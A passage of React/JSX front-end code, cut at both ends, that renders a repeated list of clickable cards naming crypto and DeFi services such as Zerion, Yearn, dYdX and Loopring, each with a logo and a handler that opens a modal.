                <span className=" font-semibold leading-6 text-gray-900">Zerion</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={zerion}
                alt="Zerion"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('LocalCrypto')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">LocalCrypto</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={lc}
                alt="lc"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('DBank')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">DBank</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={dbank}
                alt="dbank"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Rarible')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Rarible</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={rarible}
                alt="Rarible"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Yearn')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Yearn</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={yearn}
                alt="yearn"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Adex')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Adex Network</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={adex}
                alt="adex"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('DyDx')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">dYdX</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={dydx}
                alt="dydx"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('MyCrypto')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">MyCrypto</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={mycrypto}
                alt="mycrypto"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Oasis')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Oasis App</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={oasis}
                alt="oasis"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('TokenSets')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">TokenSets</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={tokenset}
                alt="tokenset"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Mantra DAO')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">MANTRA DAO</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={mantradao}
                alt="Mantradao"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Matcha')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Matcha</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={matcha}
                alt="matcha"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Kyberswap')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">kyberswap</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={kyberswap}
                alt="kyberswap"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Defi Portfolio Tracker')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Defi Portfolio Tracker</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={defiport}
                alt="defiport"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Loopring')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Loopring</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={loopring}
                alt="loopring"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('InstaDapp')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">InstaDapp</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={instadapp}
                alt="instadapp"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Matic')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Matic Network</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={matic}
                alt="matic"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('3box')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">3box</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={box}
                alt="3box"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('DDex')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">DDex</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={ddex}
                alt="ddex"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Bamboo')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Bamboo Relay</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={bamboo}
                alt="Bamboo"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Dex.blue')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Dex.blue</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={dexblue}
                alt="Dex"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('PoolTogether')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">PoolTogether</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={pool}
                alt="Pool"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('DEX.AG')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">DEX.AG</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={dexag}
                alt="Pool"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Gelato')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Gelato</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={gelato}
                alt="Gelato"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Ens Domains')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Ens Domains</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={ens}
                alt="ens"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Idle Finance')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Idle Finance</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={idle}
                alt="ens"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Iearn.Finance')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Iearn.Finance</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={iearn}
                alt="iearn"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('RCN Finance')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">RCN Finance</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={rcn}
                alt="rcn"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Hegic')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Hegic</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={hegic}
                alt="hegic"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Kickback')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Kickback</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={kick}
                alt="Kickback"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('88mph')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">88mph</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={mph88}
                alt="88mph"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Mooni')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Mooni</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={mooni}
                alt="Mooni"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Clovers')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
